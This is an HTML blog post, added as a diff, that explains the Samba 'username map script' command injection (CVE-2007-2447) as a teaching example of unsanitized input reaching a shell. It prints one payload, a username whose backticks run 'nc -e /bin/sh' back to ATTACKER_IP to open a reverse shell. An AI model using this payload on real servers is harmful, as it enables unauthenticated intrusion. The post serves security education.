@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CVE-2007-2447 Explained // crimson</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="../favicon.svg">
+<link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<div class="glow"></div>
+<div class="crt-overlay" aria-hidden="true"></div>
+
+<header class="site">
+  <nav>
+    <div class="logo glitch">~/<span>crimson</span>▋</div>
+    <div class="navlinks">
+      <a href="../index.html">Home</a>
+      <a href="../blog.html" class="active">Blog</a>
+      <a href="../reports.html">Lab Reports</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../projects.html">Projects</a>
+      <a href="../aboutme.html">About Me</a>
+    </div>
+    <div class="nav-status"><span class="status-dot"></span>online</div>
+  </nav>
+</header>
+
+<main>
+
+  <section class="page-head reveal visible" style="border-bottom:none;padding-bottom:0;">
+    <a href="../blog.html" class="back-link">← cat blog.md</a>
+    <div class="eyebrow scramble">cat cve-2007-2447.md</div>
+    <h1 class="page-title scramble glitch glow-heading">CVE-2007-2447 Explained</h1>
+    <div class="writeup-meta">
+      <span class="tag">SecConcepts</span><span class="tag">Samba</span><span class="tag">RCE</span>
+    </div>
+    <p class="writeup-summary">The Samba "username map script" RCE — nearly two decades old, and still one of the clearest examples of what happens when user input reaches a shell unchecked.</p>
+  </section>
+
+  <section class="reveal visible">
+    <div class="writeup-body">
+
+      <h2>The feature that caused the problem</h2>
+      <p>Samba supports a configuration option called <code>username map script</code>, which lets an administrator point to an external script that maps incoming usernames to local system usernames — useful for environments where the name a client logs in with doesn't match the actual system account. When a client connects, Samba passes the supplied username to that script.</p>
+
+      <h2>Where it went wrong</h2>
+      <p>The username Samba passed to the script wasn't sanitized. It went straight into a shell command construction. That means a username isn't just a username from the vulnerable version of Samba's perspective — it's a string that gets concatenated into a shell command and executed.</p>
+      <p>A username crafted like this:</p>
+      <div class="output-block">/=`nohup nc -e /bin/sh ATTACKER_IP 4444`</div>
+      <p>doesn't get treated as an unusual-but-harmless login attempt. The backticks trigger command substitution in the shell that ends up running the mapping script, and the command inside them — spawning a reverse shell — executes with whatever privileges the Samba service itself has.</p>
+
+      <h2>Why the attack is authentication-optional in practice</h2>
+      <p>The username is supplied as part of the login <em>attempt</em> — the vulnerable code path runs during the mapping step, before authentication succeeds or fails. The attacker never needs valid credentials at all; the malicious payload lives in the username field itself, and the damage is done by the time Samba would normally reject a bad login.</p>
+
+      <h2>Why this is still a great teaching example</h2>
+      <p>Most modern web-focused command injection examples involve some amount of encoding, escaping games, or WAF evasion. This one doesn't — it's about as close to the textbook definition of command injection as a real-world CVE gets: untrusted input, string concatenation into a shell command, no sanitization in between. There's no noise obscuring the core lesson.</p>
+      <p>It's also a good reminder that "authentication happens before anything dangerous runs" is an assumption, not a guarantee — plenty of vulnerable code paths execute during steps that feel like they should be safe pre-auth housekeeping.</p>
+
+      <h2>The general lesson</h2>
+      <p>Any time external input — a username, a filename, a header value — gets passed to something that builds a shell command from it, that's command injection risk, regardless of how mundane the input field seems. "It's just a username" is exactly the kind of assumption that stops people from questioning what happens to that value downstream.</p>
+
+      <p style="margin-top:32px;">Saw this exploited via Metasploit, immediately landing a root shell with no separate privilege escalation step required, in the <a href="../writeups/report-lame.html" style="color:var(--crimson-bright);">Lame writeup</a>.</p>
+
+    </div>
+  </section>
+
+</main>
+
+<footer class="site" style="padding-top:0;">
+  <div class="foot-bottom" style="max-width:1100px;margin:0 auto;padding:24px;border-top:1px solid var(--border);">
+    <div>crimson © 2026</div>
+    <div><a href="../blog.html" style="color:var(--text-dim);">← back to Blog</a></div>
+  </div>
+</footer>
+
+<script src="../script.js"></script>
+</body>
+</html>
